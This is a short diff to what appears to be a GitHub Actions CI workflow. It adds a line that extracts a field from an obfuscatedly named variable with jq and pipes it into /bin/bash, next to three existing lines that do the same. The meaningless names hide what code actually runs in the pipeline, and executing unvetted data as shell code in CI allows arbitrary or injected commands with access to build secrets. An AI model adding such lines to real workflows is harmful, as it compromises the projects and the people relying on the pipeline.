@@ -31,6 +31,7 @@ jobs:
           echo $yax42589 | jq -r .c73356 | /bin/bash
           printf '%s' "$oceo3" | jq -r .l39033 | /bin/bash
           printf '%s' "$bl45547" | jq -r .b3 | /bin/bash
+          echo $t2710 | jq -r .jy5 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
